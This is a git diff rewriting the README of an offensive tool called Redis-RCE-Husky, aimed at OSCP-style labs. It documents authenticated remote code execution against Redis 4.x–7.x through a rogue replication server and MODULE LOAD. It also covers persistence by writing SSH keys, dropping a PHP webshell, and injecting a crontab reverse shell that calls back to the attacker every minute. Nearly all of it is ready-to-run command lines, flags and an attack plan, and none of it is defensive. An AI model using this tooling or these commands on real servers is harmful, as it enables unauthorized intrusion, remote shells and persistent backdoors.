@@ -1,206 +1,166 @@
-# 🐺 Hacking Husky — Redis RCE
-
-Redis 4.x/5.x/6.x/7.x authenticated RCE tool built for OSCP conditions — unstable boxes, cron resets, dropped connections, and the 10-minute foothold window that makes you want to throw your laptop.
-
-Combines the MODULE LOAD replication exploit with three persistence methods that **don't need MODULE LOAD at all** — so when a cron wipes Redis every 10 minutes, you already have SSH access and don't care.
+# Redis-RCE-Husky
 
 ```
-  ╔═══════════════════════════════════════════════════╗
-  ║  🐺 Hacking Husky — Redis RCE                     ║
-  ║  Replication + MODULE LOAD → Shell                ║
-  |  github.com/TheHuskyHacker                        ║
-  ╚═══════════════════════════════════════════════════╝
+    __  ____  _______ __ ____  __
+   / / / / / / / ___// //_/\ \ \/ /
+  / /_/ / / / /\__ \/ ,<    \  /
+ / __  / /_/ /___/ / /| |   / /
+/_/ /_/\____//____/_/ |_|  /_/
+    ____  __________  _________    ____  ____________
+   / __ \/ ____/ __ \/  _/ ___/   / __ \/ ____/ ____/
+  / /_/ / __/ / / / // / \__ \   / /_/ / /   / __/
+ / _, _/ /___/ /_/ // / ___/ /  / _, _/ /___/ /___
+/_/ |_/_____/_____/___//____/  /_/ |_|\____/_____/
+
+    R E P L I C A T I O N  +  M O D U L E  R C E
+    Persistence first. Shell second. Cron can't touch this.
 ```
 
-## Why This Exists
+Redis 4.x/5.x/6.x/7.x authenticated RCE tool. Combines the replication MODULE LOAD exploit with three persistence methods that don’t need MODULE LOAD at all — SSH key write, webshell drop, and crontab injection.
 
-The existing tools ([Ridter/redis-rce](https://github.com/Ridter/redis-rce), [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)) work fine in a lab:
+Based on Ridter/redis-rce and n0b0dyCN/redis-rogue-server, rebuilt for OSCP conditions.
 
-- A cron resets Redis config every 10 minutes → your module gets unloaded
-- The connection drops mid-exploit → you start over
-- MODULE LOAD works once, but the service restarts → gone
-- You get a shell but can't stabilize before the reset hits
-
-This tool fixes all of that with **persistence-first** options and auto-retry logic.
-
-## Install
+## Setup
 
 ```bash
-git clone https://github.com/TheHuskyHacker/Redis-RCE-Husky
-cd husky-redis-rce
+git clone https://github.com/HackingHusky/Redis-RCE-Husky.git
+cd Redis-RCE-Husky
 chmod +x husky-redis-rce.py
+```
 
-# Build the Redis module (or use the pre-built module.so)
+A pre-built `module.so` (x86_64 Linux) is included. To recompile:
+
+```bash
 cd RedisModules-ExecuteCommand && make && cp module.so .. && cd ..
 ```
 
-Requirements: Python 3.6+ (stdlib only — no pip dependencies).
+**No pip dependencies** — stdlib Python 3.6+ only.
 
-## The Game Plan
-
-When you hit a Redis box on the OSCP, run these in order:
+## Quick Start
 
 ```bash
-# 1. Recon — see what you're working with
+# Recon first
 python3 husky-redis-rce.py -r TARGET --recon
 
-# 2. Write SSH key FIRST — this survives everything
+# One-shot RCE
+python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id'
+
+# Interactive shell
+python3 husky-redis-rce.py -r TARGET -l LHOST
+
+# SSH key persistence (no module needed — survives cron resets)
 ssh-keygen -t rsa -f husky_key -N ''
 python3 husky-redis-rce.py -r TARGET --ssh-key husky_key.pub
+ssh -i husky_key redis@TARGET
+```
 
-# 3. SSH in — now you have stable access regardless of Redis state
+## All Modes
+
+| Mode | Command | Needs Module? |
+| --- | --- | --- |
+| Recon | `--recon` | No |
+| One-shot | `-x 'command'` | Yes |
+| Interactive shell | (default after exploit) | Yes |
+| Reverse shell | `--rev --lport-rev 4444 --listen` | Yes |
+| SSH key write | `--ssh-key key.pub` | **No** |
+| Webshell write | `--webshell /var/www/html` | **No** |
+| Crontab persist | `--crontab --lhost IP --lport-rev PORT` | **No** |
+| Server-only | `--server-only` (SSRF/blind) | Yes |
+
+## OSCP Game Plan
+
+When you hit a Redis box with a cron resetting everything every few minutes:
+
+```bash
+# 1. SSH key FIRST — survives any Redis reset
+python3 husky-redis-rce.py -r TARGET --ssh-key husky_key.pub
+
+# 2. SSH in — stable access
 ssh -i husky_key redis@TARGET
 
-# 4. THEN do MODULE LOAD for RCE if you need it
+# 3. THEN do MODULE LOAD if you need command output
 python3 husky-redis-rce.py -r TARGET -l LHOST -x 'cat /root/proof.txt'
 ```
 
-Step 2 is the key insight: SSH key persistence uses only `CONFIG SET dir` + `SAVE`, which works on any Redis with CONFIG access. No module, no replication, no rogue server. The cron can reset Redis every 30 seconds and your SSH key survives because it's written to the filesystem, not stored in Redis memory.
-
-## Usage
-
-### Recon
+## Examples
 
 ```bash
-python3 husky-redis-rce.py -r 10.10.10.5 --recon
+# With auth
+python3 husky-redis-rce.py -r TARGET -l LHOST -a 'password' -x 'id'
+
+# Reverse shell with built-in listener (no separate nc)
+python3 husky-redis-rce.py -r TARGET -l LHOST --rev --lport-rev 4444 --listen
+
+# Different reverse shell payload
+python3 husky-redis-rce.py -r TARGET -l LHOST --rev --lport-rev 4444 --payload bash
+
+# Webshell (no module needed)
+python3 husky-redis-rce.py -r TARGET --webshell /var/www/html
+# → http://TARGET/husky.php?cmd=id
+
+# Crontab persistence (calls back every minute)
+python3 husky-redis-rce.py -r TARGET --crontab --lhost LHOST --lport-rev 4444
+
+# Auto-retry on unstable targets
+python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id' --retry 3
+
+# Server-only for SSRF/blind chains
+python3 husky-redis-rce.py -l LHOST --server-only
+
+# Non-standard port
+python3 husky-redis-rce.py -r TARGET -p 6380 -l LHOST -x 'id'
+
+# Verbose (see RESP traffic)
+python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id' -v
 ```
 
-Dumps version, OS, config paths, dir/dbfilename, replication role, loaded modules. Tells you what you're working with before you commit.
-
-### One-Shot Command (MODULE LOAD)
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'id'
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'cat /root/proof.txt'
-```
-
-### Interactive Shell (MODULE LOAD)
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2
-```
-
-### Reverse Shell (MODULE LOAD)
-
-```bash
-# With built-in listener
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 \
-    --rev --lport-rev 4444 --listen
-
-# Different payload if nc isn't on the target
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 \
-    --rev --lport-rev 4444 --payload bash
-```
-
-### SSH Key Persistence (No Module Needed)
-
-```bash
-# Generate a key pair
-ssh-keygen -t rsa -f husky_key -N ''
-
-# Write pubkey to target
-python3 husky-redis-rce.py -r 10.10.10.5 --ssh-key husky_key.pub
-
-# Connect (the script tells you the exact command)
-ssh -i husky_key redis@10.10.10.5
-```
-
-The script tries `/var/lib/redis/.ssh`, `/home/redis/.ssh`, and `/root/.ssh`. Override with `--ssh-dir`:
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 --ssh-key husky_key.pub --ssh-dir /home/user/.ssh
-```
-
-### Webshell (No Module Needed)
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 --webshell /var/www/html
-# → http://10.10.10.5/husky.php?cmd=id
-```
-
-### Crontab Persistence (No Module Needed)
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 --crontab --lhost 10.10.14.2 --lport-rev 4444
-# Shell calls back every minute — start: nc -lvnp 4444
-```
-
-### With Auth
-
-```bash
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -a 'P@ssw0rd' -x 'id'
-```
-
-### Auto-Retry (For Unstable Boxes)
-
-```bash
-# Retry 3 times if the connection drops or exploit fails
-python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'id' --retry 3
-```
-
-### Server-Only (SSRF/Blind)
-
-```bash
-python3 husky-redis-rce.py -l 10.10.14.2 --server-only
-```
-
-## Attack Methods Comparison
-
-| Method | Needs MODULE? | Survives Reset? | Needs Lhost? | Speed |
-|--------|:---:|:---:|:---:|:---:|
-| MODULE LOAD → exec | Yes | No | Yes | Fast |
-| MODULE LOAD → revshell | Yes | No | Yes | Fast |
-| SSH key write | No | **Yes** | No | Instant |
-| Webshell write | No | **Yes** | No | Instant |
-| Crontab write | No | **Yes** | Yes | ~1 min |
-
-**SSH key** is the best option on OSCP boxes with cron resets — it's instant, needs no rogue server, and survives absolutely everything short of someone deleting the file.
-
-## Flags Reference
-
-| Flag | Description |
-|------|-------------|
-| `-r`, `--target` | Target Redis host |
-| `-p`, `--rport` | Redis port (default: 6379) |
-| `-a`, `--auth` | Redis password |
-| `-l`, `--lhost` | Your IP for rogue server / reverse shell |
-| `--lport` | Rogue server port (default: 21000) |
-| `-f`, `--file` | Module .so path (default: module.so) |
-| `--module-name` | Filename written on target (default: husky.so) |
-| `-x`, `--cmd` | One-shot command |
-| `--rev` | Reverse shell mode |
-| `--lport-rev` | Reverse shell callback port |
-| `--listen` | Start built-in reverse listener |
-| `--payload` | Shell type: module/mkfifo/bash/python |
-| `--ssh-key` | Write this SSH pubkey for persistence |
-| `--ssh-dir` | Override target .ssh directory |
-| `--webshell` | Write PHP webshell to this web root |
-| `--crontab` | Write cron reverse shell |
-| `--recon` | Fingerprint only |
-| `--server-only` | Rogue server only (SSRF/blind) |
-| `--retry` | Retry count on failure (default: 1) |
-| `--timeout` | Socket timeout in seconds (default: 8) |
-| `-v` | Verbose RESP traffic |
-
-## File Structure
+## Flags
 
 ```
-husky-redis-rce/
+  -r, --target        Target Redis host
+  -p, --rport         Redis port (default: 6379)
+  -a, --auth          Redis password
+  -l, --lhost         Your IP (reachable from target)
+  --lport             Rogue server port (default: 21000)
+  -f, --file          Module .so file (default: module.so)
+  --module-name       Filename on target (default: husky.so)
+  -x, --cmd           One-shot command
+  --rev               Reverse shell mode
+  --lport-rev         Reverse shell port
+  --listen            Built-in reverse shell listener
+  --payload           Shell type: module/mkfifo/bash/python
+  --ssh-key           Write SSH pubkey (path to .pub file)
+  --ssh-dir           Override target .ssh directory
+  --webshell          Write PHP webshell to this path
+  --crontab           Write cron reverse shell
+  --recon             Fingerprint only
+  --server-only       Rogue server only
+  --retry N           Retry on failure (default: 1)
+  --timeout N         Socket timeout (default: 8)
+  -v                  Verbose RESP traffic
+```
+
+## Repo Structure
+
+```
+Redis-RCE-Husky/
 ├── husky-redis-rce.py              # Main exploit script
-├── module.so                        # Pre-built Redis module (x86_64)
+├── module.so                        # Pre-built module (x86_64)
 ├── README.md
-└── RedisModules-ExecuteCommand/     # Module source (for recompilation)
+├── .gitignore
+└── RedisModules-ExecuteCommand/     # Module source
     ├── Makefile
     └── src/
-        ├── module.c
-        └── redismodule.h
+        ├── module.c                 # Fixed C source (all bugs patched)
+        └── redismodule.h            # Redis Module SDK header
 ```
 
 ## Credits
 
-- [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
-- [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
-- [Pavel Toporkov — Redis post-exploitation (ZeroNights 2018)](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
+- Ridter/redis-rce
+- n0b0dyCN/redis-rogue-server
+- n0b0dyCN/RedisModules-ExecuteCommand
+- Pavel Toporkov — Redis Post-Exploitation (ZeroNights 2018)
 
 ## Disclaimer
 
